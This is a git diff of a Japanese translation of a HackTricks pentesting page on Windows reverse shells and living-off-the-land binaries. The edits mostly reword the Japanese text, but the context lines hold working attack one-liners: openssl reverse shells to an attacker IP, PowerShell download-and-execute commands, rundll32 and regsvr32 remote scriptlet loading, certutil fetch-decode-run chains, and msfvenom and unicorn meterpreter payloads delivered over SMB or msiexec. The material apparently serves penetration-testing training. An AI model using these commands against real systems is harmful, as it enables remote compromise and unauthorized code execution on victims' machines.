@@ -17,8 +17,8 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Lolbas
 
-ページ [lolbas-project.github.io](https://lolbas-project.github.io/) は、Linux の [https://gtfobins.github.io/](https://gtfobins.github.io/) の Windows バージョンです。\
-明らかに、**Windows には SUID ファイルや sudo 権限はありません**が、**バイナリ**がどのように（悪用されて）予期しないアクションを実行するために使用されるかを知ることは有用です。例えば、**任意のコードを実行する**ことなどです。
+ページ [lolbas-project.github.io](https://lolbas-project.github.io/) は、Linux の [https://gtfobins.github.io/](https://gtfobins.github.io/) のように Windows 用です。\
+明らかに、**Windows には SUID ファイルや sudo 権限はありません**が、**どのように**いくつかの **バイナリ**が予期しないアクションを実行するために（悪用）されるかを知ることは有用です。例えば、**任意のコードを実行する**ことです。
 
 ## NC
 ```bash
@@ -39,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) はポータブルで安全なNetcatの代替品です**。Unix系システムとWin32で動作します。強力な暗号化、プログラム実行、カスタマイズ可能なソースポート、継続的な再接続などの機能を備えたsbdは、TCP/IP通信のための多目的なソリューションを提供します。Windowsユーザーには、Kali Linuxディストリビューションからのsbd.exeバージョンがNetcatの信頼できる代替品として使用できます。
+**[sbd](https://www.kali.org/tools/sbd/) はポータブルで安全なNetcatの代替手段です**。Unix系システムとWin32で動作します。強力な暗号化、プログラム実行、カスタマイズ可能なソースポート、継続的な再接続などの機能を備えたsbdは、TCP/IP通信のための多目的なソリューションを提供します。Windowsユーザーには、Kali Linuxディストリビューションからのsbd.exeバージョンがNetcatの信頼できる代替品として使用できます。
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -86,7 +86,7 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 #Windows
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
-## PowerShell
+## パワーシェル
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -182,7 +182,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 [**Dll ハローワールドの例**](https://github.com/carterjones/hello-world-dll)
 
-* [ここから](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [こちらから](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -190,7 +190,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**検出されたデファンダー**
+**検出された defender によって**
 
 **Rundll32 - sct**
 
@@ -234,7 +234,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**検出されたデファンダー**
+**ディフェンダーによって検出されました**
 
 #### Regsvr32 -sct
 
@@ -278,7 +278,8 @@ B64exeをダウンロードし、デコードして実行します。
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**検出されたデファンダー**
+**ディフェンダーによって検出されました**
+
 
 ## **Cscript/Wscript**
 ```bash
@@ -295,7 +296,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 ネットワークコールを実行しているプロセス: **svchost.exe**\
-ディスクに書き込まれたペイロード: **WebDAVクライアントローカルキャッシュ**
+ディスクに書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -313,7 +314,7 @@ impacket-smbserver -smb2support kali `pwd`
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-被害者:
+被害者：
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -370,7 +371,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**私はそれを試していません**
+**私は試していません**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
@@ -445,11 +446,11 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-unicornを使用してmetasploitバックドアのpowershellバージョンを作成します
+ユニコーンを使用してメタスプロイトバックドアのPowerShellバージョンを作成します
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-msfconsoleを作成したリソースで開始します:
+作成したリソースでmsfconsoleを起動します:
 ```
 msfconsole -r unicorn.rc
 ```
@@ -461,9 +462,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## もっと
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 一部の攻撃的なPSモジュールがプリロードされたPSコンソール (暗号化)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) 一部の攻撃的なPSモジュールがプリロードされたPSコンソール（暗号化）\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジュールとプロキシ検出を備えたPSコンソール (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジュールとプロキシ検出を備えたPSコンソール（IEX）
 
 ## 参考文献
 
@@ -477,16 +478,16 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジ�
 
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください!
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
